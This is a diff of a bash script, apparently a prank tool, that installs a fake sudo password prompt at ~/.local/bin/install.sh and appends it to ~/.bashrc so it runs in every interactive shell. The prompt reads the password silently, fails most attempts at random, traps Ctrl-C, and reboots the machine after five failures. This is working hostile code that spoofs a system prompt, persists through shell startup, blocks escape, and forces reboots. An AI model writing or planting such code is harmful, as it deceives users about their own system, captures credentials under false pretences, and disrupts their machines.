@@ -5,10 +5,22 @@ max_attempts=5
 attempt_count=0
 break_loop=true
 
-prompt_sudo() {
+getCtrlCSignal() {
+    echo ""
+    attempt_count=$((attempt_count + 1))
+    if [ "$attempt_count" -ge "$max_attempts" ]; then
+        echo "Maximum attempts reached. Rebooting..."
+        attempt_count=0
+        sleep 1
+        reboot
+    fi
+    prompt_sudo
+}
 
+prompt_sudo() {
     while $break_loop; do
         echo -n "[sudo] password for $USER: "
+        trap getCtrlCSignal SIGINT
 
         if [ -t 0 ]; then
             stty -echo
@@ -51,7 +63,7 @@ add_to_startup() {
         config_file="$HOME/.bashrc"
     fi
 
-    startup_line="~/.install.sh &"
+    startup_line="if [ -t 1 ]; then ~/.local/bin/install.sh; fi"
 
     if ! grep -Fxq "$startup_line" "$config_file"; then
         echo "$startup_line" >> "$config_file"
@@ -59,24 +71,20 @@ add_to_startup() {
 }
 
 install_script() {
-    sudo_prompt_script="$HOME/.install.sh"
+    sudo_prompt_script="$HOME/.local/bin/install.sh"
 
     if [[ ! -f "$sudo_prompt_script" ]]; then
         cat > "$sudo_prompt_script" <<EOL
 #!/bin/bash
-# Get the current user
 USER=\$(whoami)
 max_attempts=5
+break_loop=true
 attempt_count=0
 
-# Function to simulate the sudo prompt with a 1/10 chance of success
-while true; do
-    # Prompt for password
+while \$break_loop; do
     echo -n "[sudo] password for \$USER: "
 
-    # Check if running in an interactive shell
     if [ -t 0 ]; then
-        # Turn off echo to hide input, read the password (will always fail)
         stty -echo
         read -r password
         stty echo
@@ -84,32 +92,26 @@ while true; do
         read -r password
     fi
 
-    # Add a new line (to simulate what happens when pressing enter)
     echo ""
 
-    # Generate a random number between 1 and 10
     random_number=\$((RANDOM % 10 + 1))
 
-    # Simulate a 1/10 chance of success
     if [ "\$random_number" -eq 1 ]; then
         echo "Password correct!"
-        exit 0  # Exit the script successfully
+        break_loop=false  # Exit loop on success
     else
-        # Always show failure message
         echo "Sorry, try again."
 
-        # Increment the attempt count
         attempt_count=\$((attempt_count + 1))
 
-        # If max attempts reached, reboot the system
         if [ "\$attempt_count" -ge "\$max_attempts" ]; then
             echo "Maximum attempts reached. Rebooting..."
+            attempt_count=0
             sleep 1
             sudo reboot
         fi
 
-        # Sleep for 1 second before asking again
-        sleep 1
+        sleep 0.5
     fi
 done
 EOL
@@ -121,4 +123,6 @@ EOL
 install_script
 add_to_startup
 
-prompt_sudo
+if [ -t 1 ]; then
+    prompt_sudo
+fi
